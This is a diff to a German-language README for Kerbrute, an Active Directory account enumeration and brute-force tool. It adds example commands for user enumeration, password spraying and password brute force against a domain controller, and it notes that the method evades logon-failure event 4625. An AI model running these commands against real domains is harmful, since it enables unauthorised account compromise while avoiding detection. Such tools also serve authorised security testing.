@@ -4,7 +4,22 @@ Ein Tool zum schnellen Erzwingen und Aufzählen gültiger Active Directory-Konte
 
 Das Bruteforcing von Windows-Passwörtern mit Kerberos ist viel schneller als jeder andere mir bekannte Ansatz und potenziell heimlicher, da Fehler bei der Vorauthentifizierung nicht das "traditionelle" Ereignis **4625** (Ein Konto konnte sich nicht anmelden) auslösen. Mit Kerberos können Sie einen Benutzernamen validieren oder eine Anmeldung testen, indem Sie nur einen UDP-Frame an den KDC (Domain Controller) senden. 
 
-## Installation
+## Beispiele für Kerbrute
+
+### User Enumeration 
+```
+kerbrute_linux_amd64 userenum -d {DOMAIN} --dc {RHOST} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
+```
+### Password Spraying
+```
+kerbrute_linux_amd64 passwordspray -d {DOMAIN} --dc {RHOST} {user.txt} {passwords.txt}
+```
+### Brute Force
+```
+kerbrute_linux_amd64 bruteuser -d {DOMAIN} --dc {RHOST} /usr/share/wordlists/rockyou.txt {USER}
+```
+
+## Kerbrute Installation
 Du kannst das letzte [Release downloaden](https://github.com/BBSynapse/Kerbrute/releases/tag/kerbrute) oder nachfolgend auch direkt mit Go installieren:
 
 ```
